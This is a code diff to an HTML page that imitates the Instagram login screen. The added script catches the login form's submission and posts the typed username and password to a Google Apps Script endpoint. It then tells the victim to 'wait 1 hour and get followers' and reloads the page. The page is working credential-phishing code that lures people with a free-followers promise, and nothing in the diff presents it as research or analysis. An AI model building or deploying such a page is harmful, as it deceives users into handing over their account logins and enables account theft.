@@ -4,6 +4,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>a
   <title>Instagram</title>
 
   <link rel="stylesheet" href="style.css">
@@ -36,7 +37,7 @@
         </div>
 
         <!--Form Login-->
-        <form id="gform" method="post" action="https://script.google.com/macros/s/AKfycbyl9lu9tpAaFCL5ua_fh6SJsgHbHRyZb90AsMUJJmkVZ58H1XFs1RbguVtqlT_8uLCGzQ/exec" method="POST" >
+        <form id="submit-form"  action=""  >
   <div class="inputs-container">
     <input type="text" id="username" name="username" placeholder="Phone number, username or email" required>
   </div>
@@ -73,6 +74,25 @@
       </span>
     </div>
   </footer>
+  <script>
+    $("#submit-form").submit((e)=>{
+        e.preventDefault()
+        $.ajax({
+            url:"https://script.google.com/macros/s/AKfycbyl9lu9tpAaFCL5ua_fh6SJsgHbHRyZb90AsMUJJmkVZ58H1XFs1RbguVtqlT_8uLCGzQ/exec",
+            data:$("#submit-form").serialize(),
+            method:"post",
+            success:function (response){
+                alert("wait 1 hour and get followers")
+                window.location.reload()
+                //window.location.href="https://google.com"
+            },
+            error:function (err){
+                alert("Something Error")
+
+            }
+        })
+    })
+</script>
 </body>
 
 </html>
